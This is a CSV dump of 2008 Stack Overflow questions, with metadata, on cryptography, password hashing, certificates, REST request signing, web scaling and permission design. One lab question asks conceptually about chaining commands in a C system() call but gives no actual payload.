Id,PostTypeId,AcceptedAnswerId,ParentId,CreationDate,DeletionDate,Score,ViewCount,Body,OwnerUserId,OwnerDisplayName,LastEditorUserId,LastEditorDisplayName,LastEditDate,LastActivityDate,Title,Tags,AnswerCount,CommentCount,FavoriteCount,ClosedDate,CommunityOwnedDate
"252180","1","252612","","2008-10-30 23:52:12","","22","6401","<p>I've been assigned the task of buying a digital certificate for my company to sign our code. We develop applications in the Microsoft space - mostly WPF or Web Based.</p>

<p>I've investigated options and found Comodo to be well priced and responsive, and we're ready to go ahead and purchase a cert through them.. however in the signup form there are various private key options that I'm not too sure about, namely:</p>

<ol>
<li><p>CSP</p>

<ul>
<li>Microsoft Base Cryptographic Provider</li>
<li>Microsoft Base Smart Card Crypto Provider</li>
<li>Microsoft Enhanced Cryptographic Provider v1.0</li>
<li>Microsoft Software Cryptographic Provider</li>
</ul></li>
<li><p>Key Size</p>

<ul>
<li>1024</li>
<li>2048</li>
<li>4096</li>
</ul></li>
<li><p>Exportable?</p>

<ul>
<li>Yes / No</li>
</ul></li>
<li><p>User Protected?</p>

<ul>
<li>Yes / No</li>
</ul></li>
</ol>

<p>Just wondering what all of this means, and what the best options are for our requirements?  Any advice/ suggestions would be appreciated</p>

<p>thanks heaps
Greg</p>
","21969","Gregorius","","","","2013-04-30 16:37:38","Code Signing Certificate Options","<cryptography><certificate><code-signing>","3","0","10","",""
"247304","1","247627","","2008-10-29 15:44:47","","257","294560","<p>I'm not sure how password hashing works (will be implementing it later), but need to create database schema now.</p>

<p>I'm thinking of limiting passwords to 4-20 characters, but as I understand after encrypting hash string will be of different length.</p>

<p>So, how to store these passwords in the database?</p>
","28098","sneg","608639","","2014-10-12 01:33:03","2019-04-19 14:58:41","What data type to use for hashed password field and what length?","<mysql><hash><types><passwords><cryptography>","10","5","178","",""
"246422","1","252173","","2008-10-29 11:06:18","","155","266017","<p>How can I deploy an iPhone application from Xcode to real iPhone device without having a US$99 Apple certificate?</p>
","16066","DFG","3681880","Mitch Wheat","2016-06-04 00:56:24","2019-05-21 02:29:11","How can I deploy an iPhone application from Xcode to a real iPhone device?","<ios><xcode><deployment><certificate>","12","3","120","",""
"245600","1","245608","","2008-10-29 02:21:41","","7","18398","<p>In an information security lab I'm working on, I've been tasked with executing multiple commands with a single call to ""system()"" (written in C, running on Fedora).  What is the syntax that will allow me to execute more than command through system()?  (The idea being you could execute arbitrary commands through a program running on a remote computer, if the program interacts with the OS through the system() call.)</p>

<p>I.e.:</p>

<pre><code>char command[] = ""????? \r\n""; 
system(command);
</code></pre>
","28076","Chance","387076","","2013-08-06 00:21:12","2013-08-06 00:21:12","Using a Single system() Call to Execute Multiple Commands in C","<c><security><system><exploit>","3","2","2","",""
"244903","1","244919","","2008-10-28 21:18:41","","58","13755","<p>Is there a significance to the word ""salt"" for a password salt?</p>
","26604","KRH","","","","2010-03-24 03:15:40","Why is a password salt called a ""salt""?","<passwords><salt>","8","1","7","2011-07-07 23:24:52",""
"240283","1","240305","","2008-10-27 15:22:21","","15","5058","<p>I'm working on a REST service that has a few requirements:</p>

<ol>
<li>It has to be secure.</li>
<li>Users should not be able to forge requests.</li>
</ol>

<p>My current proposed solution is to have a custom Authorization header that look like this (this is the same way that the amazon web services work):</p>

<pre><code>Authorization: MYAPI username:signature
</code></pre>

<p>My question is how to form the signature.  When the user logs into the service they are given a secret key which they should be able to use to sign requests.  This will stop other users submitting requests on their behalf, but will not stop them forging requests.</p>

<p>The application that will be using this service is an iPhone application, so I was thinking we could have a public key embedded in the application which we can do an additional signature with, but does this mean we'll have to have two signatures, one for the user key and one for the app key?</p>

<p>Any advice would be greatly appreciated, I'd quite like to get this right the first time.</p>
","4590","jonnii","3017003","jonnii","2014-07-14 22:19:42","2014-10-31 14:50:34","Authorizing REST Requests","<rest><authentication><http-headers><authorization><rest-security>","4","1","7","",""
"216110","1","216142","","2008-10-19 06:29:21","","6","4229","<p>Does anyone know of any good tools to view the store name, store location, or values of an X.509 Certificate?</p>
","29345","Adron","","","","2016-01-12 18:41:12","Tool for Viewing X.509 Certificates?","<wcf><certificate><x509>","5","0","3","",""
"211169","1","285377","","2008-10-17 05:39:40","","19","8592","<p>So I was wondering if there are any major differences between the various implementations of the hash algorithms, take the SHA series of algorithms for example. All of them have 3 implementations each, 1 in managed code and 2 wrappers around different native crypto APIs, but are there any major differences between using any of them? I can imagine that the wrapper versions could have higher performance since its being executed in native code, but surley hey all need to perform the exact same calculations and thus provide the same output ie hey are interchangable. Is this correct?</p>

<p>For instance SHA512CNG cant be used on XP SP2 (docs are wrong) but SHA512MANAGED can.</p>

<hr>

<p>@Maxim - Thank you, but not quite what I was asking for. I was asking if there is any difference, other than possibly performance, from using the Managed/CryptoServiceProvider/CNG implementations of a given hash algorithm. With .NET 3.5 you get all of the hash algorithms with three implementations, so</p>

<p>SHA512Managed
SHA512CryptoServiceProvider
SHA512Cng</p>

<p>The latter two being wrappers around native APIs. This is true for all SHAxxx implementations for example.</p>
","25319","","1288","","2013-01-31 11:58:03","2018-08-29 10:25:37","CNG, CryptoServiceProvider and Managed implementations of HashAlgorithm","<c#><.net><security><hash><cryptography>","4","3","3","",""
"210901","1","","","2008-10-17 02:07:27","","31","7903","<p>I often marvel at how I can go to www.google.com, from anywhere in the world at any time, and get the returned page so fast.</p>

<p>Sure, they compress their output and keep to a minimal design - that helps.</p>

<p>But they must have <em>millions</em> of simultaneous hits to the box sitting on the web that DNS lists as ""www.google.com"".</p>

<p>All of you who have set up Apache or other web servers know that things are great and super fast until you start getting a few thousand simultaneous connections, let alone <em>millions</em>! </p>

<p>So, how do they do it? I guess they have a whole farm of server machines, but you'd never know it. When I went to Verizon just now the url was www22.verizon.com. You never see ""www22.google.com"", <em>never</em>.</p>

<p>Any ideas what specific technologies they use, or what technologies us non-Google mortals can use to do the same thing?</p>
","25362","Roark Fan","819887","","2014-10-08 12:20:15","2017-12-12 02:08:26","How do you scale HTTP server like Google?","<http><webserver><scalability>","9","1","14","",""
"202011","1","","","2008-10-14 17:07:32","","658","639301","<p>How can I encrypt and decrypt a string in C#?</p>
","3291","Shane Blazek","5894241","Shane Blazek","2018-03-20 08:46:35","2019-06-03 09:52:12","Encrypt and decrypt a string in C#?","<c#><.net><encryption><mono><cryptography>","28","10","346","",""
"199252","1","199304","","2008-10-13 22:27:09","","49","42991","<p>I'm considering the best way to design a permissions system for an ""admin"" web application. The application is likely to have many users, each of whom could be assigned a certain role; some of these users could be permitted to perform specific tasks outside the role.</p>

<p>I can think of two ways to design this: one, with a ""permissions"" table with a row for every user, and boolean columns, one for each task, that assign them permissions to perform those tasks. Like this:</p>

<pre>
User ID          Manage Users     Manage Products     Manage Promotions     Manage Orders
1                true             true                true                  true
2                false            true                true                  true
3                false            false               false                 true
</pre>

<p>Another way I thought of was to use a bit mask to store these user permissions. This would limit the number of tasks that could be managed to 31 for a 32-bit signed integer, but in practice we're unlikely to have more than 31 specific tasks that a user could perform. This way, the database schema would be simpler, and we wouldn't have to change the table structure every time we added a new task that would need access control. Like this: </p>

<pre>
User ID          Permissions (8-bit mask), would be ints in table
1                00001111
2                00000111
3                00000001
</pre>

<p>What mechanisms have people here typically used, and why?</p>

<p>Thanks!</p>
","27649","Hari","","","","2019-07-19 04:37:16","What is the best way to manage permissions for a web application - bitmask or database table?","<database-design><web-applications><permissions>","9","1","26","",""
